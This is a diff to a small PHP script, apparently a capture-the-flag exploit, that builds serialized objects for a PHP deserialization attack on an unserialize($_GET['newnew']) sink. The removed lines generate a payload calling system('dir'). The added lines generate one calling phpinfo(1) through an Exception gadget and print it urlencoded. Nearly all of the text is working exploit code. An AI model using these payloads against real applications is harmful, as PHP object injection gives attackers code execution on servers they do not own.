@@ -12,10 +12,8 @@ class A
     }
 }
 
-$yj=new A();
-$yj->a="system";
-$yj->b="dir";
-echo(urlencode(serialize($yj)));
-
-// $newnew = unserialize($_GET['newnew']);
-// throw new Exception('can can need new new');
+$exp=new A();
+$exp->a="Exception";
+$exp->b="phpinfo(1)";
+echo(urlencode(serialize($exp)));
+throw new Exception('can can need new new');
